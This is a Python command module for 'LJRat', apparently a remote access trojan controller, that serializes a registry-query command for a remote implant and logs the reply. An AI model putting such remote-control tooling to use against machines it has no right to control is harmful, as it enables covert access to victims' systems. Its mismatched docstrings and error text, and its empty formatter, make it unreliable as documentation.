"""
Module that adds the put functionality to LJRat
"""

import struct
import message
import os
import log
from error import *
from helper import str_to_c_str, get_timestamp_str, filetime_to_dt, sizeof_fmt
from globals import ctx
from session import HEADER_LEN, INT_SIZE

MODULE_ID = 0x06

def entrypoint(self, args):
    """ Query the registry
    'reg_query HKLM Software'
    """
    
    # Validate local file exists prior to building the message
    args = validator(args)
    if not args:
        return None

    module_args = {"KEY": args, "JOB_ID": ctx.get_next_job()}
    msg = message.Message(_serialize(module_args))
    return (msg, E_SUCCESS)


def validator(args):
    '''Nothing checked at this time'''
    return args

def _serialize(data):
    '''Function to take all the required arguments and pack a data structure with binary data'''
    serialized_data = bytearray()
    file_bytes = None

    result_code = 0
    cmd_type = MODULE_ID
    job_id = data["JOB_ID"]

    key = str_to_c_str(data["KEY"])
    key_len = len(key)
    data_len = HEADER_LEN + INT_SIZE + key_len
    serialized_data.extend(struct.pack("I", data_len))
    serialized_data.extend(struct.pack("I", job_id))
    serialized_data.extend(struct.pack("I", cmd_type))
    serialized_data.extend(struct.pack("I", result_code))
    serialized_data.extend(struct.pack("I", key_len))
    serialized_data.extend(struct.pack(f"{key_len}s", key))

    return serialized_data


def _deserialize(msg):
    '''Function that calls the formatter and outputs the data to a log'''
    log_dir = ctx.log_dir + os.sep

    if msg.result_code == E_SUCCESS:
        formatter(msg.payload)
        log.write_to_log(log_dir, ".reg_query", msg.payload, "Registry Query complete: ")
    else:
        print(f"Error in directory listing: {ERROR_TABLE[msg.result_code]}")

    return

def formatter(file_input):
    '''Function that knows how the data will be returned from the remote side and
    turns it into a readable format'''
    return
